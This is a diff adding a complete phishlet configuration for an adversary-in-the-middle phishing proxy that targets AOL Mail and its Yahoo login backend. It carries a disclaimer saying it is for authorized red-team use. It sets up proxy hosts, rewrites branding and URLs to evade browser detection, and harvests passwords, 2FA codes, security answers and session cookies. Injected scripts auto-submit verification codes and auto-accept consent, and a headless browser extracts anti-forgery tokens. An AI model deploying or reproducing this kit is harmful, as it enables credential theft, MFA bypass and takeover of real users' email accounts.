@@ -1,0 +1,287 @@
+# AOL Mail Phishlet
+# For red team and authorized penetration testing only
+# Author: Red-Queen Team
+# Version: 3.0.0 - December 2024
+#
+# AOL is owned by Yahoo and uses Yahoo's authentication system
+# with AOL branding. This phishlet handles the AOL-branded
+# login flow while leveraging Yahoo auth backend.
+
+name: 'AOL'
+author: 'red-queen'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  # AOL domains
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'aol.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'aol.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'my', orig_sub: 'my', domain: 'screenname.aol.com', session: true, is_landing: false, auto_filter: true}
+  # Shared Yahoo auth infrastructure
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  # Assets
+  - {phish_sub: 's', orig_sub: 's', domain: 'aolcdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'aolcdn.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, is_landing: false, auto_filter: true}
+  # Additional mail servers
+  - {phish_sub: 'mg', orig_sub: 'mg', domain: 'mail.aol.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'login.aol.com', orig_sub: 'login', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'www.aol.com', orig_sub: 'www', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'mail.aol.com', orig_sub: 'mail', domain: 'aol.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json']}
+  
+  # Maintain AOL branding when redirected to Yahoo auth
+  - triggers_on: 'login.yahoo.com'
+    orig_sub: 'login'
+    domain: 'yahoo.com'
+    search: 'Yahoo'
+    replace: 'AOL'
+    mimes: ['text/html']
+    
+  - triggers_on: 'login.yahoo.com'
+    orig_sub: 'login'
+    domain: 'yahoo.com'
+    search: 'yahoo.com'
+    replace: 'aol.com'
+    mimes: ['text/html']
+
+auth_tokens:
+  # AOL session cookies
+  - domain: '.aol.com'
+    keys: ['Y', 'T', 'F', 'PH', 'A1', 'A1S', 'A3', 'AO', 'B', 'GUC', 'PRF', 'GUCS', 'HP', '.*,regexp']
+  - domain: 'login.aol.com'
+    keys: ['sB', 'B', 'Y', 'T', 'A1', 'A1S', '.*,regexp']
+  - domain: '.login.aol.com'
+    keys: ['sB', 'B', 'Y', 'T', '.*,regexp']
+  - domain: 'mail.aol.com'
+    keys: ['Y', 'T', 'F', 'A3', 'TBC', 'AT', 'ucs', '.*,regexp']
+  # Shared Yahoo cookies (AOL uses Yahoo auth)
+  - domain: '.yahoo.com'
+    keys: ['Y', 'T', 'F', 'A1', 'A1S', 'GUC', '.*,regexp']
+  - domain: 'login.yahoo.com'
+    keys: ['sB', 'B', 'Y', 'T', '.*,regexp']
+
+auth_urls:
+  - '/account/challenge'
+  - '/account/verify'
+  - '/account/passwd'
+  - '/config/verify'
+  - '/.src/aol'
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    # 2FA / Account key
+    - key: 'verifyCode'
+      search: '([0-9]{6,8})'
+      type: 'post'
+    - key: 'code'
+      search: '([0-9]{6})'
+      type: 'post'
+    # Phone verification
+    - key: 'phone'
+      search: '(.*)'
+      type: 'post'
+    # Security questions
+    - key: 'answer'
+      search: '(.*)'
+      type: 'post'
+    # Browser fingerprint tokens
+    - key: 'crumb'
+      search: '(.*)'
+      type: 'post'
+    - key: 'acrumb'
+      search: '(.*)'
+      type: 'post'
+
+#===============================================================================
+# REWRITE URLS - BROWSER DETECTION EVASION
+#===============================================================================
+rewrite_urls:
+  # Clean main login path
+  - trigger:
+      domains: ['login.aol.com']
+      paths: ['/']
+    rewrite:
+      path: '/signin'
+      query: []
+
+  # Rewrite password challenge  
+  - trigger:
+      domains: ['login.aol.com']
+      paths: ['/account/challenge/password']
+    rewrite:
+      path: '/verify/password'
+      query: []
+
+  # Rewrite push notification challenge
+  - trigger:
+      domains: ['login.aol.com', 'login.yahoo.com']
+      paths: ['/account/challenge/push']
+    rewrite:
+      path: '/verify/device'
+      query: []
+
+  # Rewrite TOTP challenge
+  - trigger:
+      domains: ['login.aol.com', 'login.yahoo.com']
+      paths: ['/account/challenge/totp']
+    rewrite:
+      path: '/verify/code'
+      query:
+        - key: 'method'
+          value: 'totp'
+
+  # Rewrite SMS challenge
+  - trigger:
+      domains: ['login.aol.com', 'login.yahoo.com']
+      paths: ['/account/challenge/sms']
+    rewrite:
+      path: '/verify/code'
+      query:
+        - key: 'method'
+          value: 'sms'
+
+  # Consent page rewrite
+  - trigger:
+      domains: ['guce.yahoo.com', 'consent.yahoo.com']
+      paths: ['/consent*']
+    rewrite:
+      path: '/agree'
+      query: []
+
+force_post:
+  - path: '/account/challenge/password'
+    search:
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'rememberMe', value: 'on'}
+      - {key: 'persistent', value: 'y'}
+    type: 'post'
+    
+  - path: '/'
+    search:
+      - {key: 'username', search: '.*'}
+    force:
+      - {key: 'signin', value: 'Next'}
+      - {key: 'persistent', value: 'y'}
+    type: 'post'
+
+login:
+  domain: 'login.aol.com'
+  path: '/'
+
+js_inject:
+  - trigger_domains: ['login.aol.com', 'login.yahoo.com']
+    trigger_paths: ['/', '/account/challenge', '/config/verify']
+    script: |
+      // AOL/Yahoo multi-step login handler
+      (function() {
+        // Store username across steps
+        document.addEventListener('submit', function(e) {
+          var form = e.target;
+          var usernameInput = form.querySelector('input[name="username"]');
+          if (usernameInput) {
+            sessionStorage.setItem('aol_username', usernameInput.value);
+          }
+        });
+        
+        // Auto-check stay signed in
+        setTimeout(function() {
+          var staySignedIn = document.querySelector('input[name="persistent"]');
+          if (staySignedIn && !staySignedIn.checked) {
+            staySignedIn.click();
+          }
+          
+          var rememberMe = document.querySelector('input[name="rememberMe"]');
+          if (rememberMe && !rememberMe.checked) {
+            rememberMe.click();
+          }
+        }, 500);
+      })();
+
+  - trigger_domains: ['login.aol.com', 'login.yahoo.com']
+    trigger_paths: ['/account/challenge/push', '/account/challenge/totp', '/account/challenge/sms']
+    script: |
+      // 2FA handling
+      document.addEventListener('DOMContentLoaded', function() {
+        var codeInput = document.querySelector('input[name="verifyCode"], input[name="code"]');
+        if (codeInput) {
+          codeInput.addEventListener('input', function() {
+            if (this.value.length >= 6) {
+              var submitBtn = document.querySelector('button[type="submit"]');
+              if (submitBtn) {
+                setTimeout(function() {
+                  submitBtn.click();
+                }, 200);
+              }
+            }
+          });
+        }
+      });
+
+  - trigger_domains: ['guce.yahoo.com', 'consent.yahoo.com']
+    trigger_paths: ['/']
+    script: |
+      // Auto-accept consent
+      setTimeout(function() {
+        var acceptBtn = document.querySelector('button[name="agree"], form[name="agree"] button');
+        if (acceptBtn) {
+          acceptBtn.click();
+        }
+      }, 1000);
+
+# Evilpuppet for crumb/token extraction
+evilpuppet:
+  triggers:
+    - trigger_domains: ['login.aol.com', 'login.yahoo.com']
+      trigger_paths: ['/account/challenge']
+      trigger_type: 'url'
+      action: 'extract_token'
+      token_name: 'crumb'
+      
+  interceptors:
+    - domain: 'login.aol.com'
+      path: '/account/challenge/password'
+      token_name: 'crumb'
+      inject_to: 'form_field'
+      
+    - domain: 'login.yahoo.com'
+      path: '/account/challenge/password'
+      token_name: 'crumb'
+      inject_to: 'form_field'
+  
+  headless_config:
+    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    viewport_width: 1920
+    viewport_height: 1080
+    timeout_ms: 30000
+    stealth_mode: true
+    
+  extraction_rules:
+    - name: 'crumb'
+      type: 'html_attribute'
+      selector: 'input[name="crumb"]'
+      attribute: 'value'
+      
+    - name: 'acrumb'
+      type: 'html_attribute'
+      selector: 'input[name="acrumb"]'
+      attribute: 'value'
+      
+    - name: 'browser_fp'
+      type: 'cookie'
+      domain: '.aol.com'
